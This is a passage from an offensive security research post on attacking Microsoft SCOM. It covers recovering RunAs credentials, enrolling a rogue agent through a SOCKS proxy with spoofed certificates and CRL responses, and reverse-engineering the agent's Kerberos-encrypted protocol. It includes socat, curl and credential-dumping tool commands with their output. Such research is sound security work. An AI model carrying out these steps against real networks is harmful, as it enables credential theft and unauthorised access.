</span></span></code></pre></div><p>But wait, what is this <code>UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA</code> value in the Password field ? Is there yet more encryption to reverse ? Luckily for us, no, it’s just Base64.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>echo</span> <span class=nx>UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA</span> <span class=o>|</span> <span class=nx>base64</span> <span class=o>-</span><span class=nx>d</span>
</span></span><span class=line><span class=cl><span class=nx>SuperSecure</span><span class=o>!%</span>
</span></span></code></pre></div><h3 id=runas-credential-recovery-off-host>RunAs Credential Recovery Off-Host<a hidden class=anchor aria-hidden=true href=#runas-credential-recovery-off-host>#</a></h3><p>While the above methods for on-host credential recovery are useful, we wanted to see what could be done from a host <strong>not</strong> currently enrolled in SCOM.</p><p>This is useful for scenarios where we know SCOM is in use within the environment but we don’t have access to a machine which is enrolled in SCOM. Although SCOM is designed for monitoring of servers, there is no technical limitation stopping us from enrolling any domain joined machine (such as a user’s workstation) if it can be approved.</p><h3 id=agent-enrollment-approval>Agent Enrollment Approval<a hidden class=anchor aria-hidden=true href=#agent-enrollment-approval>#</a></h3><p>If we wish to enroll our own agent in SCOM, we need to understand the available security controls around enrollment.</p><p>SCOM allows management agents to be deployed via two methods: push based installation (via the agent discovery wizard) and manual installation. For push based installation, a new discovery scan is first initiated via the SCOM management console.</p><p><img alt=mggroup.png loading=lazy src=/scom/621ca4a9-7060-4ac3-b05a-ae2f2e334c1a.png></p><p>Once a new host is discovered, the SCOM server requires a direct connection to the target machine over SMB/RPC in order to install the SCOM management agent. After installation, the agent will communicate via the dedicated agent communication port <em>5723/TCP</em>.</p><p><img alt="Untitled Diagram-Page-22.drawio (4).png" loading=lazy src=/scom/Untitled_Diagram-Page-22.drawio_(4).png></p><p>In modern environments, a firewall typically blocks this type of direct access, so instead admins may opt for manual installation.</p><p>With manual installation, the management agent MSI installer <code>MOMAgent.msi</code> is run directly on the host to perform the enrollment process. By default, any agents installed via this method will be automatically rejected by the SCOM management server.</p><p><img alt=console.png loading=lazy src=/scom/console.png></p><p>In order to allow manual enrollments, this setting must be changed to either place manual agent installations in a pending state and manually approve them or to automatically approve them.</p><p>If selecting manual approval, admins may find this setting overly restrictive, especially when enrolling a large number of hosts. Requiring manual approval in this case is simply not practical, and admins may opt to instead allow automatic approval.</p><p>We have often observed real world configurations where this default setting has been modified to automatically approve manually installed agents. Indeed, many online <a href=https://www.prajwaldesai.com/install-scom-agent-using-command-line/>guides</a> will suggest modifying this setting to allow automatic approval.</p><p><img alt=auto.png loading=lazy src=/scom/auto.png></p><h3 id=enrolling-our-own-agent>Enrolling Our Own Agent<a hidden class=anchor aria-hidden=true href=#enrolling-our-own-agent>#</a></h3><p>In the event automatic approval has been enabled, we can seek to enroll our own agent with the below methods. One additional requirement for this is knowledge of the SCOM management group name which we wish to join our agent to. This is stored in the registry at the below path <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\Management Groups\*</code> on any machines already enrolled in SCOM.</p><p>Another common location to find references to the management group is in file shares (such as SCCM distribution groups) containing post build configuration scripts (.bat, .ps1 etc). As the management group name is provided as an argument to the SCOM agent MSI installer, it’s not uncommon to find references to these within install scripts on the network.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>@</span><span class=nx>echo</span> <span class=nx>off</span>
</span></span><span class=line><span class=cl><span class=o>:</span><span class=nx>setup</span>
</span></span><span class=line><span class=cl><span class=nx>msiexec</span><span class=p>.</span><span class=nx>exe</span> <span class=o>/</span><span class=nx>i</span> <span class=o>%</span><span class=nx>current</span><span class=o>%</span><span class=nx>amd64</span><span class=err>\</span><span class=nx>MOMAgent</span><span class=p>.</span><span class=nx>msi</span> <span class=o>/</span><span class=nx>qn</span> <span class=nx>USE_SETTINGS_FROM_AD</span><span class=o>=</span><span class=mi>0</span> <span class=nx>USE_MANUALLY_SPECIFIED_SETTINGS</span><span class=o>=</span><span class=mi>1</span> <span class=nx>MANAGEMENT_GROUP</span><span class=o>=</span><span class=nx>CLIENTMGRP1</span> <span class=nx>MANAGEMENT_SERVER_DNS</span><span class=o>=</span><span class=nx>SCOM</span><span class=p>.</span><span class=nx>CLIENT</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=nx>MANAGEMENT_SERVER_AD_NAME</span><span class=o>=</span><span class=nx>SCOM</span><span class=p>.</span><span class=nx>CLIENT</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=nx>AcceptEndUserLicenseAgreement</span><span class=o>=</span><span class=mi>1</span>
</span></span></code></pre></div><p>If <a href="https://learn.microsoft.com/en-us/system-center/scom/manage-ad-integration-agent-assignment?view=sc-om-2025">Active Directory integration</a> is enabled, then the management group name will be stored under the OperationsManager container.</p><p><img alt=2.jpg loading=lazy src=/scom/2.jpg></p><p>With knowledge of the management group name, we can perform the below steps to enroll our agent.</p><h3 id=certificate-based-enrollment-via-socks-proxy>Certificate Based Enrollment via SOCKS Proxy<a hidden class=anchor aria-hidden=true href=#certificate-based-enrollment-via-socks-proxy>#</a></h3><p>As is often the case when attempting to perform a new attack, we asked ourselves the age-old question: “Will it proxy?”</p><p>Indeed, all of the SCOM agent communications occur over a single TCP port (<em>5723/TCP</em>), so setting up a simple single port forward via SOCKS is straightforward. Where things get complicated is trying to trick the SCOM agent into enrolling from a machine <strong>not</strong> joined to the domain.</p><p>Before we dive in, let’s go over the requirements we need to perform the attack. We should also note that if our goal is to recover RunAs credentials, these will need to be configured with the <code>Less Secure</code> option.</p><h3 id=requirements>Requirements<a hidden class=anchor aria-hidden=true href=#requirements>#</a></h3><p>In order to enroll an agent in SCOM via certificates, we require:</p><ul><li>Automatic agent approval to be enabled</li><li>Knowledge of the SCOM Management Group name</li><li>A machine certificate suitable for authentication (more on this below)</li><li>Network connectivity to SCOM server on TCP port 5723</li></ul><h3 id=scenerio>Scenerio<a hidden class=anchor aria-hidden=true href=#scenerio>#</a></h3><p>In this scenario, we assume we have compromised a user’s workstation which does not currently have the SCOM agent installed. Remember, this is likely to be the case as SCOM is typically only used for server monitoring. Assuming we can reach the SCOM server on port 5723 from this workstation we can setup our SOCKS proxy to forward this port back to our local Windows attacker virtual machine (VM).</p><p>The below diagram illustrates the scenario setup.</p><p><img alt="Untitled Diagram-Page-7.drawio (3).png" loading=lazy src=/scom/Untitled_Diagram-Page-7.drawio_(3).png></p><h3 id=attacker-vm-setup>Attacker VM Setup<a hidden class=anchor aria-hidden=true href=#attacker-vm-setup>#</a></h3><p>To satisfy the SCOM agent, we need to configure our attacker VM to match the compromised workstation as closely as possible. This requires we:</p><ul><li>Set the server name to match the victim workstation we are impersonating</li><li>Promote the server to a domain controller, setting the Active Directory name to match the victim domain</li><li>Import the Certificate Authority (CA) certificates from the victim workstation and add them to the trusted root store</li></ul><h3 id=certificate-setup><strong>Certificate Setup</strong><a hidden class=anchor aria-hidden=true href=#certificate-setup>#</a></h3><p>In order to authenticate against the SCOM server using certificates, we need to first ensure we have access to a certificate issued to our victim workstation that is suitable for use with SCOM. Although most documentation online suggests creating a new template in ADCS for SCOM specifically, the only requirements are the below Extended Key Usages (EKUs).</p><ul><li>Client Authentication</li><li>Server Authentication</li></ul><p>As a result, the default machine template in ADCS will do us just fine. The only requirement is that the subject name contains the computer name of our victim workstation.</p><p>In order for the SCOM agent to trust the SCOM server, we will also need to recover the certificates for the internal CA servers and add them to the trusted root authorities of our VM.</p><p>To do this, a simple C# assembly can be used to export certificates from the trust store of the Beacon machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>mattjohnson</span><span class=err>\</span><span class=nx>CertExtract</span><span class=p>.</span><span class=nx>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Searching</span> <span class=k>in</span> <span class=nx>store</span><span class=o>:</span> <span class=nx>AddressBook</span>
</span></span><span class=line><span class=cl><span class=nx>No</span> <span class=nx>certificates</span> <span class=nx>found</span> <span class=nx>containing</span> <span class=nx>the</span> <span class=nx>substring</span> <span class=s1>&#39;DC&#39;</span> <span class=k>in</span> <span class=nx>their</span> <span class=nx>subject</span> <span class=nx>names</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>AddressBook</span> <span class=nx>store</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>Searching</span> <span class=k>in</span> <span class=nx>store</span><span class=o>:</span> <span class=nx>AuthRoot</span>
</span></span><span class=line><span class=cl><span class=nx>No</span> <span class=nx>certificates</span> <span class=nx>found</span> <span class=nx>containing</span> <span class=nx>the</span> <span class=nx>substring</span> <span class=s1>&#39;DC&#39;</span> <span class=k>in</span> <span class=nx>their</span> <span class=nx>subject</span> <span class=nx>names</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>AuthRoot</span> <span class=nx>store</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=nx>Searching</span> <span class=k>in</span> <span class=nx>store</span><span class=o>:</span> <span class=nx>CertificateAuthority</span>
</span></span><span class=line><span class=cl><span class=nx>Certificate</span> <span class=nx>Subject</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>CA</span><span class=o>-</span><span class=mi>02</span><span class=p>,</span> <span class=nx>DC</span><span class=o>=</span><span class=nx>CLIENT</span><span class=p>,</span> <span class=nx>DC</span><span class=o>=</span><span class=nx>LOCAL</span>
</span></span><span class=line><span class=cl><span class=nx>Base64</span> <span class=nx>Encoded</span> <span class=nx>Certificate</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=nx>MIIEOD</span><span class=p>...&lt;</span><span class=nt>SNIP</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>We can then install the machine certificate into the Local Machine Personal store. After installing the CA certificates, we confirm we now have a chain of trust setup linking back to the internal root CAs.</p><p><img alt=image.png loading=lazy src=/scom/image%203.png></p><p>In order to tell the SCOM agent which certificate to use for authentication, we run <code>MomCertImport.exe</code> and select the machine certificate we imported.</p><figure><img loading=lazy src=/scom/image%204.png width=500></figure><p>As a final validation, we can use <a href=https://github.com/blakedrumm/SCOM-Scripts-and-SQL/blob/master/Powershell/Test-SCOMCertificate.ps1>this</a> handy PowerShell script to confirm our certificates and chain of trust are setup correctly. If all is done right, we should see something similar to the below output.</p><p><img alt=image.png loading=lazy src=/scom/image%205.png></p><h3 id=performing-the-enrollment-via-socks>Performing the Enrollment via SOCKS<a hidden class=anchor aria-hidden=true href=#performing-the-enrollment-via-socks>#</a></h3><p>With our certificates installed correctly, we can setup our SOCKS proxy and use <code>socat</code> to create a port forward to route traffic to the SCOM server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>socat</span> <span class=nx>TCP4</span><span class=o>-</span><span class=nx>LISTEN</span><span class=o>:</span><span class=mi>5723</span><span class=p>,</span><span class=nx>fork</span> <span class=nx>SOCKS4</span><span class=o>:</span><span class=mf>127.0.0.1</span><span class=o>:</span><span class=mf>10.0.0.25</span><span class=o>:</span><span class=mi>5723</span><span class=p>,</span><span class=nx>socksport</span><span class=o>=</span><span class=mi>9000</span>
</span></span></code></pre></div><p>We will also need to add a host file entry for the SCOM server hostname pointing at our SOCKS server IP address.</p><p>Finally, we can restart the SCOM agent service and perform the device enrollment. We can then check the EventLogs to confirm the enrollment status.</p><p>Performing this attack for the first time in the field, we saw the below error.</p><p><img alt=Untitled loading=lazy src=/scom/Untitled.png></p><p>This indicated the SCOM <strong>Agent</strong> (not server) could not validate the certificate chain. It turns out the SCOM agent must be able to verify the Certificate Revocation List (CRL) contained within the SCOM <strong>Server</strong> certificate when it’s presented to the agent.</p><p>Luckily, the CRL is fetched over HTTP, which allows us to passively discover the hostname of the machine hosting the CRL with Wireshark. Then we just need to add this hostname to our VM hosts file and setup a HTTP listener to reply with an HTTP 200 (i.e., &ldquo;OK&rdquo;) response to the CRL request. When we restart the agent, we see the requests for the CRL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>mattjohnson</span><span class=err>@</span><span class=nx>XPS</span><span class=o>-</span><span class=mi>15</span><span class=o>-</span><span class=mi>7590</span><span class=o>:</span><span class=err>/tmp$ sudo python2.7 -m SimpleHTTPServer 80</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>sudo</span><span class=p>]</span> <span class=nx>password</span> <span class=k>for</span> <span class=nx>mattjohnson</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=nx>Serving</span> <span class=nx>HTTP</span> <span class=nx>on</span> <span class=mf>0.0.0.0</span> <span class=nx>port</span> <span class=mi>80</span> <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.1.154</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>04</span><span class=o>/</span><span class=nx>Apr</span><span class=o>/</span><span class=mi>2024</span> <span class=mi>17</span><span class=o>:</span><span class=mi>43</span><span class=o>:</span><span class=mi>48</span><span class=p>]</span> <span class=nx>code</span> <span class=mi>404</span><span class=p>,</span> <span class=nx>message</span> <span class=nx>File</span> <span class=nx>not</span> <span class=nx>found</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.1.154</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>04</span><span class=o>/</span><span class=nx>Apr</span><span class=o>/</span><span class=mi>2024</span> <span class=mi>17</span><span class=o>:</span><span class=mi>43</span><span class=o>:</span><span class=mi>48</span><span class=p>]</span> <span class=s2>&#34;GET /CERT001-CA.crl HTTP/1.1&#34;</span> <span class=mi>404</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.1.154</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>04</span><span class=o>/</span><span class=nx>Apr</span><span class=o>/</span><span class=mi>2024</span> <span class=mi>17</span><span class=o>:</span><span class=mi>43</span><span class=o>:</span><span class=mi>48</span><span class=p>]</span> <span class=nx>code</span> <span class=mi>404</span><span class=p>,</span> <span class=nx>message</span> <span class=nx>File</span> <span class=nx>not</span> <span class=nx>found</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.1.154</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>04</span><span class=o>/</span><span class=nx>Apr</span><span class=o>/</span><span class=mi>2024</span> <span class=mi>17</span><span class=o>:</span><span class=mi>43</span><span class=o>:</span><span class=mi>48</span><span class=p>]</span> <span class=s2>&#34;GET /CERT001-CA.crl HTTP/1.1&#34;</span> <span class=mi>404</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.1.71</span> <span class=o>-</span> <span class=o>-</span> <span class=p>[</span><span class=mi>04</span><span class=o>/</span><span class=nx>Apr</span><span class=o>/</span><span class=mi>2024</span> <span class=mi>17</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>09</span><span class=p>]</span> <span class=nx>code</span> <span class=mi>404</span><span class=p>,</span> <span class=nx>message</span> <span class=nx>File</span> <span class=nx>not</span> <span class=nx>found</span>
</span></span></code></pre></div><p>Sending an HTTP 200 response for the CRL to the agent allowed the certificate validation to pass. Restarting the agent again, we saw a successful enrollment message in the EventLogs.</p><p><img alt=image.png loading=lazy src=/scom/image%206.png></p><p>At this stage, the SCOM agent will begin to pull down the policy configuration file over <em>5723/TCP</em> via our SOCKS proxy. By monitoring for the creation of any new DPAPI encrypted entries under the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\HealthService\Parameters\$MANAGEMENT_GROUP$\SCOM1\SSDB\SSIDs\*</code> registry key, we can determine if any RunAs credentials are in use.</p><p>We can then use any of the previously discussed methods to recover any RunAs credentials stored either in the policy or in the registry.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=o>&gt;</span> <span class=p>.</span><span class=err>\</span><span class=nx>SharpSCOM</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>DecryptRunAs</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>█▀</span> <span class=err>█</span> <span class=err>█</span> <span class=err>▄▀█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀</span> <span class=err>█▀▀</span> <span class=err>█▀█</span> <span class=err>█▀▄▀█</span>
</span></span><span class=line><span class=cl><span class=err>▄█</span> <span class=err>█▀█</span> <span class=err>█▀█</span> <span class=err>█▀▄</span> <span class=err>█▀▀</span> <span class=err>▄█</span> <span class=err>█▄▄</span> <span class=err>█▄█</span> <span class=err>█</span> <span class=err>▀</span> <span class=err>█</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Author</span><span class=o>:</span> <span class=nx>Matt</span> <span class=nx>Johnson</span> <span class=o>-</span> <span class=nx>SpecterOps</span> <span class=o>-</span> <span class=nx>v0</span><span class=mf>.0.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Searching</span> <span class=k>for</span> <span class=nx>RunAs</span> <span class=nx>credentials</span> <span class=nx>within</span> <span class=nx>the</span> <span class=nx>registry</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Found</span> <span class=mi>3</span> <span class=nx>credentials</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_action</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_dataread</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Username</span><span class=o>:</span> <span class=nx>ludus</span><span class=err>\</span><span class=nx>opsmgr_datawrite</span>
</span></span><span class=line><span class=cl>    <span class=nx>Password</span><span class=o>:</span> <span class=nx>Password123</span>
</span></span></code></pre></div><h3 id=kerberos-enrollment-via-c>Kerberos Enrollment via C#<a hidden class=anchor aria-hidden=true href=#kerberos-enrollment-via-c>#</a></h3><p>Due to the amount of setup required to perform the above attack, we looked to develop our own C# based tool to perform the enrollment requests made by the SCOM agent ourselves. As we had previously focused on using certificates for authentication via SOCKS, we decided this time to focus on Kerberos authentication.</p><p>In order to do this, we needed to perform reverse engineering of the SCOM agent process <code>HealthService.exe</code> as well as the proprietary network protocol used to speak with the SCOM server.</p><h3 id=requirements-1><strong>Requirements</strong><a hidden class=anchor aria-hidden=true href=#requirements-1>#</a></h3><p>In order to enroll an agent in SCOM via Kerberos, we require:</p><ul><li>Automatic agent approval to be enabled</li><li>Knowledge of the SCOM Management Group name</li><li>Ability to perform Kerberos Authentication as a domain computer account</li></ul><h3 id=agent-communications>Agent Communications<a hidden class=anchor aria-hidden=true href=#agent-communications>#</a></h3><p>Reviewing the <a href="https://learn.microsoft.com/en-us/system-center/scom/plan-planning-agent-deployment?view=sc-om-2025&amp;tabs=Windows">documentation</a>, we can see that the agent traffic we are interested in is sent over port <em>5723/TCP</em>.</p><p><img alt=om2016-integration-oms.png loading=lazy src=/scom/om2016-integration-oms.png></p><p>Running Wireshark and filtering on this port, we can see a flurry of requests come in after restarting the agent service.</p><p><img alt=image.png loading=lazy src=/scom/image%207.png></p><p>At first glance, the agent traffic appears encrypted with no hints as to how the data is structured. Following the TCP stream, we can locate the first packet sent by the agent to the server (identified by the presence of the <code>MOM</code> ASCII bytes).</p><p><img alt=image.png loading=lazy src=/scom/image%208.png></p><p>According to the documentation, if we do not currently have any certificates installed, the agent will default to using Kerberos for authentication. We can confirm this by identifying the <code>06 09 2a 86 48 86 f7 12 01 02 02</code> bytes in the initial request sent to the server. This corresponds to the Object Identifier (OID) for GSS-API Kerberos v5 (<code>1.2.840.113554.1.2.2</code>).</p><p><img alt=image.png loading=lazy src=/scom/image%209.png></p><p>To quickly parse out the Kerberos data in Wireshark, we can extract these bytes (starting from <code>60 82</code>, base64 encode them and wrap them in a HTTP Negotiate authorization header.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>curl</span> <span class=o>-</span><span class=nx>i</span> <span class=o>-</span><span class=nx>H</span> <span class=s2>&#34;Authorization: Negotiate YIIG1wYJKoZIhvcSAQ&lt;TRIMMED FOR BREVITY&gt;&#34;</span> <span class=p>&lt;</span><span class=nt>http</span><span class=err>://</span><span class=na>192.168.1.107</span><span class=err>:</span><span class=na>8000</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>We can then use curl to send a dummy request to a Python web server while running Wireshark. Wireshark will then parse out the HTTP authorization header and apply it’s Kerberos v5 protocol dissector on the data.</p><p><img alt=image.png loading=lazy src=/scom/image%2010.png></p><p>Here, we see Wireshark has correctly identified the GSS-API data and can see the SCOM Kerberos service name <code>MSOMHSvc</code>.</p><p><img alt=image.png loading=lazy src=/scom/image%2011.png></p><p>After authentication finishes, the rest of the agent traffic appears to be encrypted.</p><p><img alt=image.png loading=lazy src=/scom/image%2012.png></p><p>Analysing the encrypted data, we notice the bytes <code>05 04</code> present in the data that both the agent and server sent.</p><p><img alt=image.png loading=lazy src=/scom/image%2013.png></p><p>This corresponds to a Kerberos GSS-API Wrap token as documented in the RFC <a href=https://datatracker.ietf.org/doc/html/rfc4121#section-4.2.6.2.>here</a>.</p><p><img alt=image.png loading=lazy src=/scom/image%2014.png></p><p>The Windows SSPI equivalent to the <code>GSS_Wrap</code> function is <a href=https://learn.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-encryptmessage>EncryptMessage</a>.</p><p><img alt=image.png loading=lazy src=/scom/image%2015.png></p><p>As both the client and server have knowledge of a shared secret (the Kerberos session key), they can use this to encrypt any additional application data via a call to <code>EncryptMessage</code>.</p><p>Now that we know how the SCOM agent traffic is encrypted, the challenge then becomes how best to decrypt it so that we can begin to construct our own client.</p><h3 id=agent-data-encryption>Agent Data Encryption<a hidden class=anchor aria-hidden=true href=#agent-data-encryption>#</a></h3><p>After exploring many different options to decrypt the agent traffic, we decided to try and implement our own basic SCOM server to intercept messages that the legitimate SCOM agent generated.</p><p>Based on the observations made from the captured agent traffic, we made an educated guess that Windows SSPI with the Kerberos Security Support Provider was likely the authentication API in use.</p><p>Looking for a quick win and wanting to avoid diving directly into IDA, we created a simple SSPI client and server that would perform authentication via Kerberos. We could send some sample encrypted messages and capture the network traffic with Wireshark. Finally, we could then overlay the traffic generated from our client and compare it to the traffic captured from the legitimate SCOM agent.</p><p>To ensure the data aligned as closely as possible, we opted to not utilise any builtin .NET libraries which provide further abstractions on top of SSPI (such as <code>NegotiateStream</code>). Rather, we made use of the amazing public library <a href=https://github.com/antiduh/nsspi>nsspi</a> which provides access to the SSPI directly from C# via pinvoke.</p><p>The C# code for the sample client can be seen below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>TcpClient</span> <span class=nx>tcpClient</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>TcpClient</span><span class=p>(</span><span class=nx>server</span><span class=p>,</span> <span class=nx>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>NetworkStream</span> <span class=nx>networkStream</span> <span class=o>=</span> <span class=nx>tcpClient</span><span class=p>.</span><span class=nx>GetStream</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>ClientCurrentCredential</span> <span class=nx>clientCred</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ClientCurrentCredential</span><span class=p>(</span><span class=nx>PackageNames</span><span class=p>.</span><span class=nx>Kerberos</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>ClientContext</span> <span class=nx>client</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ClientContext</span><span class=p>(</span><span class=nx>clientCred</span><span class=p>,</span> <span class=nx>$</span><span class=s2>&#34;MSOMHSvc/{server}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>ContextAttrib</span><span class=p>.</span><span class=nx>MutualAuth</span> <span class=o>|</span> <span class=nx>ContextAttrib</span><span class=p>.</span><span class=nx>Confidentiality</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Authenticate
</span></span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>Init</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span> <span class=nx>out</span> <span class=kr>byte</span><span class=p>[]</span> <span class=nx>clientToken</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>networkStream</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>generate_ap_req</span><span class=p>(</span><span class=nx>clientToken</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>clientToken</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>apRep</span> <span class=o>=</span> <span class=nx>parse_ap_rep</span><span class=p>(</span><span class=nx>networkStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=nx>client</span><span class=p>.</span><span class=nx>Init</span><span class=p>(</span><span class=nx>apRep</span><span class=p>,</span> <span class=nx>out</span> <span class=nx>clientToken</span><span class=p>)</span> <span class=o>==</span> <span class=nx>SecurityStatus</span><span class=p>.</span><span class=nx>ContinueNeeded</span><span class=p>)</span> <span class=p>{</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Encrypt and send message
</span></span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>plainText</span> <span class=o>=</span> <span class=nx>Encoding</span><span class=p>.</span><span class=nx>UTF8</span><span class=p>.</span><span class=nx>GetBytes</span><span class=p>(</span><span class=s2>&#34;Hello, world!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>encrypted</span> <span class=o>=</span> <span class=nx>client</span><span class=p>.</span><span class=nx>Encrypt</span><span class=p>(</span><span class=nx>plainText</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>networkStream</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>encrypted</span><span class=p>),</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>encrypted</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Receive and decrypt response
</span></span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>encryptedResponse</span> <span class=o>=</span> <span class=nx>parse_kerb_wrap_token</span><span class=p>(</span><span class=nx>networkStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>decrypted</span> <span class=o>=</span> <span class=nx>client</span><span class=p>.</span><span class=nx>Decrypt</span><span class=p>(</span><span class=nx>encryptedResponse</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>string</span> <span class=nx>response</span> <span class=o>=</span> <span class=nx>Encoding</span><span class=p>.</span><span class=nx>UTF8</span><span class=p>.</span><span class=nx>GetString</span><span class=p>(</span><span class=nx>decrypted</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nx>Console</span><span class=p>.</span><span class=nx>WriteLine</span><span class=p>(</span><span class=nx>$</span><span class=s2>&#34;Response: {response}&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Along with the corresponding server code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>TcpClient</span> <span class=nx>tcpClient</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>TcpClient</span><span class=p>(</span><span class=nx>server</span><span class=p>,</span> <span class=nx>port</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>NetworkStream</span> <span class=nx>networkStream</span> <span class=o>=</span> <span class=nx>tcpClient</span><span class=p>.</span><span class=nx>GetStream</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>ClientCurrentCredential</span> <span class=nx>clientCred</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ClientCurrentCredential</span><span class=p>(</span><span class=nx>PackageNames</span><span class=p>.</span><span class=nx>Kerberos</span><span class=p>))</span>
